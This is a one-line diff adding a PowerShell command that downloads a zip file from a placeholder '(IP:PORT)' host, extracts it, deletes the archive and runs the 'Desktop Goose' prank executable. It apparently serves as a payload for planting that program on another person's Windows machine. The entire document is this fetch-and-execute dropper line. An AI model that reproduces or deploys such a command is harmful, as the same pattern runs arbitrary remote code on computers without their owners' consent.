@@ -1,0 +1,1 @@
+Invoke-WebRequest http://(IP:PORT)/(DesktopGoose Zip file path) -OutFile Goose.zip; Expand-Archive Goose.zip -DestinationPath Goose; del Goose.zip; Goose\GooseDesktop.exe
